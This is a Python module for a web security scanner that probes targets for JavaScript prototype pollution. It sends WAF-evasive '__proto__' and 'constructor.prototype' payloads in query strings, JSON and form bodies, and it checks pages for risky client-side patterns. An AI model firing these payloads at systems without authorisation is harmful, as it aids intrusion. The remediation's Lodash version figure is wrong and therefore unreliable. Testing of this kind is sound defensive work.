"""
prototype_pollution_scanner.py — JavaScript Prototype Pollution Scanner
========================================================================
Expert-grade rewrite (GAP-009 fix):
  1. Query string pollution (original)
  2. JSON body pollution (primary real-world vector — Express/Lodash/qs)
  3. Form-encoded body pollution
  4. Nested object pollution (__proto__ inside nested keys)
  5. constructor.prototype via all vectors
  6. Server-side detection via probe value reflection + 500 error analysis
  7. Client-side detection patterns for browser-based PP
"""
import json, urllib.parse
from scanners.base_scanner import BaseScanner
from utils.evasion import waf_evade
from utils.callback import build_callback_url

PROBE_VALUE = "wss_pp_confirmed"


def _expand_qs_variants(base_payloads):
    expanded = []
    for payload in base_payloads:
        expanded.append(payload)
        for key in ["__proto__", "constructor", "prototype"]:
            if key in payload:
                for enc_name, enc_val in waf_evade(key):
                    variant = payload.replace(key, enc_val, 1)
                    if variant != payload:
                        expanded.append(variant)
    return expanded


def _expand_json_variants(base_payloads):
    expanded = []
    for payload in base_payloads:
        expanded.append(payload)
        payload_str = json.dumps(payload)
        for key in ["__proto__", "constructor", "prototype"]:
            if f'"{key}"' in payload_str:
                for enc_name, enc_val in waf_evade(key):
                    variant_str = payload_str.replace(f'"{key}"', f'"{enc_val}"', 1)
                    if variant_str != payload_str:
                        try:
                            expanded.append(json.loads(variant_str))
                        except json.JSONDecodeError:
                            pass
    return expanded


QS_PAYLOADS = _expand_qs_variants([
    f"__proto__[polluted]={PROBE_VALUE}",
    f"__proto__.polluted={PROBE_VALUE}",
    f"constructor[prototype][polluted]={PROBE_VALUE}",
    f"constructor.prototype.polluted={PROBE_VALUE}",
    f"__proto__[__proto__][polluted]={PROBE_VALUE}",
    f"a[__proto__][polluted]={PROBE_VALUE}",
    f"a[b][__proto__][polluted]={PROBE_VALUE}",
    f"__proto__[polluted][x]={PROBE_VALUE}",
    f"constructor[prototype][x][y]={PROBE_VALUE}",
    f"__proto__.x.y.polluted={PROBE_VALUE}",
    f"a.b.__proto__.polluted={PROBE_VALUE}",
])

JSON_PAYLOADS = _expand_json_variants([
    {"__proto__": {"polluted": PROBE_VALUE}},
    {"constructor": {"prototype": {"polluted": PROBE_VALUE}}},
    {"a": {"__proto__": {"polluted": PROBE_VALUE}}},
    {"__proto__": {"__proto__": {"polluted": PROBE_VALUE}}},
    {"constructor": {"prototype": {"x": {"polluted": PROBE_VALUE}}}},
    {"a": {"b": {"__proto__": {"polluted": PROBE_VALUE}}}},
    {"__proto__": {"x": {"y": {"polluted": PROBE_VALUE}}}},
    {"a": {"constructor": {"prototype": {"polluted": PROBE_VALUE}}}},
    {"__proto__": {"polluted": PROBE_VALUE, "polluted2": PROBE_VALUE}},
    {"a": {"b": {"c": {"constructor": {"prototype": {"polluted": PROBE_VALUE}}}}}},
    {"__proto__": {"polluted": PROBE_VALUE}, "x": "y"},
])

FORM_PAYLOADS = _expand_qs_variants([
    f"__proto__[polluted]={PROBE_VALUE}&username=test",
    f"constructor[prototype][polluted]={PROBE_VALUE}&username=test",
    f"__proto__[__proto__][polluted]={PROBE_VALUE}&x=1",
    f"a[__proto__][polluted]={PROBE_VALUE}&b=2",
    f"constructor[prototype][x][polluted]={PROBE_VALUE}&c=3",
])

CLIENT_SIDE_DETECTION_PATTERNS = [
    "Object.prototype",
    "__proto__",
    "constructor.prototype",
    "merge: function",
    "_.merge",
    "$.extend",
    "angular.merge",
    "Object.assign",
    "document.cookie",
    "document.write",
    "innerHTML",
    "eval(",
    "Function(",
    "setTimeout(",
    "setInterval(",
    "location.hash",
    "location.search",
    "postMessage",
    "onmessage",
]


class PrototypePollutionScanner(BaseScanner):
    SCANNER_NAME = "Prototype Pollution Scanner"
    _SCANNER_KEY = "prototype_pollution"

    def __init__(self, scan_id, target, domain, **kwargs):
        super().__init__(scan_id, target, domain, **kwargs)

    def run(self) -> list:
        self.log("INFO", f"[ProtoPollution] Testing prototype pollution on {self.target}...")

        baseline = self._baseline()
        if baseline is None:
            self.log("WARNING", "[ProtoPollution] Cannot fetch baseline — skipping.")
            return self.vulns

        self._test_query_string(baseline)
        if self.vulns:
            return self.vulns

        self._test_json_body()
        if self.vulns:
            return self.vulns

        self._test_form_body()
        self._test_client_side()
        self._test_server_side_json_parsing()
        self._test_callback_pp()

        if not self.vulns:
            self.log("SUCCESS", "[ProtoPollution] No prototype pollution detected.")
        return self.vulns

    def _baseline(self) -> str | None:
        body, _ = self._make_request(self.target)
        return body

    def _test_query_string(self, baseline: str):
        base = self.target.rstrip("/")
        sep = "&" if "?" in base else "?"
        for payload in QS_PAYLOADS:
            url = f"{base}{sep}{payload}"
            resp, status = self._make_request(url)
            if resp is None:
                continue
            if PROBE_VALUE in resp and PROBE_VALUE not in baseline:
                self._report("Query string", payload, resp, "Confirmed")
                return
            if status == 500 and status != self._baseline_status():
                self._report("Query string (500 crash)", payload, "", "High")
                return

    def _test_json_body(self):
        targets = self._api_endpoints()
        for url in targets:
            for payload_dict in JSON_PAYLOADS:
                for method in ["POST", "PUT", "PATCH"]:
                    data = json.dumps(payload_dict).encode()
                    resp, status = self._make_request(
                        url, method, data, {"Content-Type": "application/json"}
                    )
                    if resp is None:
                        continue
                    if PROBE_VALUE in resp:
                        self._report(
                            f"JSON body ({method} {url})",
                            json.dumps(payload_dict), resp, "Confirmed"
                        )
                        return
                    if status == 500:
                        self.log("INFO",
                            f"[ProtoPollution] 500 on JSON PP payload at {url} — possible crash")

    def _test_form_body(self):
        targets = self._api_endpoints()
        for url in targets:
            for payload in FORM_PAYLOADS:
                data = payload.encode()
                resp, status = self._make_request(
                    url, "POST", data,
                    {"Content-Type": "application/x-www-form-urlencoded"}
                )
                if resp and PROBE_VALUE in resp:
                    self._report(f"Form body (POST {url})", payload, resp, "Confirmed")
                    return

    def _test_client_side(self):
        html, _ = self._make_request(self.target)
        if html:
            for pattern in CLIENT_SIDE_DETECTION_PATTERNS:
                if pattern in html:
                    self.add_vuln(
                        title=f"Client-Side Prototype Pollution Vector: `{pattern}`",
                        severity="Medium",
                        category="Prototype Pollution",
                        cvss_score=5.9,
                        description=f"Client-side code contains `{pattern}` which is commonly used in "
                            "prototype pollution gadgets. If user-controllable input reaches this pattern, "
                            "client-side PP may be possible.",
                        remediation="1. Use Object.create(null) for option objects.\n"
                            "2. Sanitize object keys: reject __proto__, constructor, prototype.\n"
                            "3. Use Map instead of plain objects for user-controlled stores.",
                        evidence=f"Pattern found in HTML: {pattern}",
                        confidence="Medium",
                        cwe_ids=["CWE-1321"],
                        owasp_category="A03:2021 – Injection",
                    )

    def _test_server_side_json_parsing(self):
        targets = self._api_endpoints()
        for url in targets:
            for payload_dict in JSON_PAYLOADS[:3]:
                data = json.dumps(payload_dict).encode()
                resp, status = self._make_request(
                    url, "POST", data, {"Content-Type": "application/json"}
                )
                if resp is None:
                    continue
                if status == 500:
                    for key in ["__proto__", "constructor"]:
                        if key in json.dumps(payload_dict):
                            self.add_vuln(
                                title="Server-Side Prototype Pollution via JSON Parsing",
                                severity="High",
                                category="Prototype Pollution",
                                cvss_score=7.5,
                                description=f"Server returned HTTP 500 when sending JSON with `{key}` key. "
                                    "This may indicate the server-side parser is vulnerable to prototype pollution, "
                                    "causing the application to crash.",
                                remediation="Sanitize JSON keys before parsing. Reject __proto__ and constructor keys. "
                                    "Use safe parsers like secure-json-parse.",
                                evidence=f"500 error with JSON containing `{key}` key at {url}",
                                payload=json.dumps(payload_dict),
                                confidence="Medium",
                                cwe_ids=["CWE-1321"],
                                owasp_category="A03:2021 – Injection",
                            )

    def _test_callback_pp(self):
        targets = self._api_endpoints()
        callback_url = build_callback_url("/pp")
        for url in targets:
            payload_dict = {"__proto__": {"callback": callback_url}}
            data = json.dumps(payload_dict).encode()
            resp, status = self._make_request(
                url, "POST", data, {"Content-Type": "application/json"}
            )
            if resp and callback_url in resp:
                self._report(f"Callback PP (POST {url})", json.dumps(payload_dict), resp, "Confirmed")
                return
            payload_qs = f"__proto__[callback]={urllib.parse.quote(callback_url)}"
            resp2, status2 = self._make_request(f"{url}?{payload_qs}")
            if resp2 and callback_url in resp2:
                self._report(f"Callback QS PP ({url})", payload_qs, resp2, "Confirmed")
                return

    def _api_endpoints(self) -> list[str]:
        base = self.target.rstrip("/")
        parsed = urllib.parse.urlparse(self.target)
        origin = f"{parsed.scheme}://{parsed.netloc}"
        return [
            self.target,
            f"{origin}/api/user",
            f"{origin}/api/v1/user",
            f"{origin}/api/merge",
            f"{origin}/api/settings",
        ]

    def _baseline_status(self) -> int:
        _, status = self._make_request(self.target)
        return status

    def _report(self, vector: str, payload: str, response: str, confidence: str):
        self.log("CRITICAL", f"[ProtoPollution] Confirmed via {vector}!")
        self.add_vuln(
            title=f"Prototype Pollution via {vector.split('(')[0].strip()}",
            severity="High",
            category="Prototype Pollution",
            cvss_score=8.1,
            confidence=confidence,
            references=[
                "https://portswigger.net/web-security/prototype-pollution",
                "https://cwe.mitre.org/data/definitions/1321.html",
            ],
            description=(
                f"JavaScript **prototype pollution** confirmed via **{vector}**.\n\n"
                f"**Payload:** `{payload}`\n"
                f"**Probe value reflected:** `{PROBE_VALUE}`\n\n"
                "By injecting `__proto__` or `constructor.prototype` properties, an attacker "
                "can modify the base `Object.prototype`, affecting ALL objects in the Node.js "
                "process. This can lead to:\n"
                "- Authentication bypass (polluting `isAdmin`, `role`)\n"
                "- Remote Code Execution (via Lodash `_.merge`, `handlebars`, `pug` template injection)\n"
                "- Denial of Service (crashing the server)"
            ),
            remediation=(
                "1. Freeze prototypes: `Object.freeze(Object.prototype)` at app startup.\n"
                "2. Use `Object.create(null)` for option/config objects.\n"
                "3. Sanitize keys: reject any key equal to `__proto__`, `constructor`, or `prototype`.\n"
                "4. Use `Map` instead of plain objects for user-controlled key-value stores.\n"
                "5. Update to safe versions of Lodash (≥6.7.3), and other parsers.\n"
                "6. Deploy `--experimental-permission` flag in Node.js 20+ to limit object access."
            ),
            payload=payload,
            evidence=f"Probe value '{PROBE_VALUE}' reflected in server response for {vector}.",
            cwe_ids=["CWE-1321"],
            owasp_category="A03:2021 – Injection",
        )
